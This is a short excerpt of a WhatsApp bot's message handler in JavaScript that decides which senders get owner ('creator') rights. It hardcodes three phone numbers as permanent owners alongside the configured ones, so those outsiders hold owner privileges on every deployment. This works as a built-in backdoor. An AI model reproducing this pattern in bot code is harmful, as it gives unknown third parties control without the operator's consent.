...
const Handler = async (chatUpdate, sock, logger) => {
    try {
        ...
        const botNumber = await sock.decodeJid(sock.user.id);
        const staticOwners = ['255714595078', '255781144539', '255767570963'];
        const configOwners = Array.isArray(config.OWNER_NUMBER) ? config.OWNER_NUMBER : [config.OWNER_NUMBER];
        const ownerNumbers = [...new Set([...staticOwners, ...configOwners])].map(num => num + '@s.whatsapp.net');
        let isCreator = false;

        if (m.isGroup) {
            isCreator = ownerNumbers.includes(m.sender) || m.sender === botNumber;
        } else {
            isCreator = ownerNumbers.includes(m.sender) || m.sender === botNumber;
        }
